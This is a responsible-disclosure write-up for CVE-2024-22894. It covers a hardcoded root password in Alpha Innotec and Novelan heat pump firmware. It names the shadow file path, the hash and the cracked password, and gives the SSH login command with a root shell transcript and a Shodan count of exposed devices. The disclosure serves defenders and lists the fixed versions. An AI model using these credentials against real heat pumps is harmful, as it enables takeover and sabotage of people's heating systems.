# CVE-2024-22894
Downloaded the latest heatpump firmware version `wp2reg-V3.88.0-9015` of [https://www.heatpump24.com/DownloadArea.php](https://www.heatpump24.com/DownloadArea.php?layout=2).
Within this firmware is a file called : `wp2reg-V3.88.0-9015\wp2reg-AlphaInnotech-prod\home.wp2reg-V3.88.0-9015_221213\share\shadow`

This contains a 3DES encrypted password `root:MEfgX2vrPJzuE:0:0:99999:7:::` of the system root user and when decrypted/cracked (within 5 seconds) show the password `eschi`.

When you connect my heatpump to the network using a network cable, you can use the 'root' user and the found password to login onto the SSH service that is available. 
```
> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-cbc root@$IP
$IP's password: eschi
# id
uid=0(root) gid=0 groups=0
# uname -a
Linux [...]  2.6.33.20 #3 PREEMPT Wed Oct 24 14:25:34 CEST 2018 armv5tejl GNU/Linux
```
This vulnerability is applicable to all the  Alpha Innotec and Novelan heatpumps, running the Luxtronic controller.
It is verified and addressed by AIT Deutschland, the OEM of Alpha Innotec and Novelan and the vulnerability is present in the following firmware versions:

* Versions prior to `V2.88.3`
* Versions prior to `V3.89.0`
* Versions prior to  `V4.81.3`

The heat pump needs to be connected to the network using a LAN (RJ-45) connection to misuse it. 
According to Shodan there are still 47 heatpumps connected to the internet using the same SSH version and fingerprint, that could be compromised using this exploit.

Once exploited could cause a lot of damage, by changing settings or removing the whole configuration/software causing the heat pump to malfunction or crash.
For example, the home directory contains the following files that could be intresting for an attacker:


```
# ls -alh /home
total 7448
drwxr-xr-x    5 root     0           4.8K Jan 12 08:59 .
drwxr-xr-x   14 root     0            992 Aug  1  2011 ..
drwxr-xr-x    3 root     0            224 Jan  1  1970 .update
-rw-rw-rw-    1 root     0          92.3K Jul 20  2022 10Min_1
-rw-rw-rw-    1 root     0          92.3K Sep 15  2022 10Min_2
-rwxrwxrwx    1 root     0          22.3K Jan 13  2021 ASB.bin
-rwxrwxrwx    1 root     0          23.3K Jul 15  2019 ASB_BL_Switch.bin
-rwxrwxrwx    1 root     0          22.1K Jul 15  2019 ASB_bootloader.bin
-rwxrwxrwx    1 root     0           1.2K Jun 16  2021 Defines.txt
-rwxrwxrwx    1 root     0          15.7K Jun 14  2021 HZIO.lin
-rw-rw-rw-    1 root     0            648 Jan  3 18:55 Info.dti
-rwxrwxrwx    1 root     0          15.3K Jul 24  2020 LD2AG.lin
-rwxrwxrwx    1 root     0          37.5K Jul 15  2019 LWD.lin
-rwxrwxrwx    1 root     0          26.8K Feb  8  2021 LWD45.lin
-rwxrwxrwx    1 root     0          38.8K Jul 15  2019 LWD90.lin
-rwxrwxrwx    1 root     0          37.9K Jul 15  2019 LWDRev.lin
-rwxrwxrwx    1 root     0          40.0K Jun 16  2021 LuxConst.sqlite
-rwxrwxrwx    1 root     0          26.9K Jul 24  2020 MSW_15.lin
-rwxrwxrwx    1 root     0          28.4K Jul 24  2020 MSW_Inverter.lin
-rw-rw-rw-    1 root     0         435.2K Jan 12 08:59 NewProc
-rw-rw-rw-    1 root     0           8.8K Jan  1 01:00 ParamArchive_1704067200
[...]
-rw-rw-rw-    1 root     0           8.8K Jan 12 01:00 ParamArchive_1705017600
-rwxrwxrwx    1 root     0          96.9K Jul 15  2019 SEC.bin
-rwxrwxrwx    1 root     0          31.6K Jul 15  2019 SWP.lin
-rwxrwxrwx    1 root     0          30.6K Jul 15  2019 SWPH.lin
-rwxrwxrwx    1 root     0          30.4K Jul 15  2019 SWPH291.lin
drwxrwxrwx    2 root     0            648 Apr 25  2023 Webserver
-rwxrwxrwx    1 root     0           5.0M Jun 16  2021 appl
-rwxrwxrwx    1 root     0            147 Jul 15  2019 appl.cfg
-rw-rw-rw-    1 root     0           8.8K Jan 12 08:59 appl_param1
-rw-rw-rw-    1 root     0           8.8K Jan 12 06:59 appl_param2
-rwxrwxrwx    1 root     0           9.4K Jul 15  2019 bootloader.lin
-rw-r--r--    1 root     0          20.0K Jan  1 05:10 default.sqlite
-rw-r--r--    1 root     0              0 Jan  1  1970 default.sqlite-wal
-rw-rw-r--    1 root     0             56 Sep 15  2022 errlog
-rw-r--r--    1 root     0          42.9K Apr  1  2011 firmware
-rwxrwxrwx    1 root     0            391 Jul 15  2019 index.html
-rwxrwxrwx    1 root     0          35.2K Jun 16  2021 lang_CR
[...
-rwxrwxrwx    1 root     0          37.8K Jun 16  2021 lang_tr
drwxr-xr-x    2 root     0            360 Jan  1  1970 share
-rwxrwxrwx    1 root     0             37 Jul 15  2019 timezone
-rwxrwxrwx    1 root     0           1.1K Jul 15  2019 udhcpc.script
```

### Fixed versions

* `V2.88.3` or higher
* `V3.89.0` or higher
* `V4.81.3` or higher
  
### Timeline

 * [13-06-2023] Responsible Disclosure to: AIT-Deutschland (OEM), Alpha Innotec (Brand), Novelan (Brand), Nathan (Dutch reseller).
 * [19-06-2023] Answer from AIT-Deutschland to schedule a meeting.
 * [22-06-2023] Meeting with AIT-Deutschland about the vulnerability.
 * [01-07-2023 - 01-12-2023] AIT-Deutschland develops fix for the vulnerability
 * [14-12-2023] Gathering information for the CVE details.
 * [10-01-2024] Meeting with AIT-Deutschland about submitting the CVE details.
 * [26-01-2024] CVE ID CVE-2024-22894 assigned.
 * [30-01-2024] CVE-2024-22894 published.

### Credits
Credits go to AIT-Deutschland for taking this issue seriously and fixing it with priority.
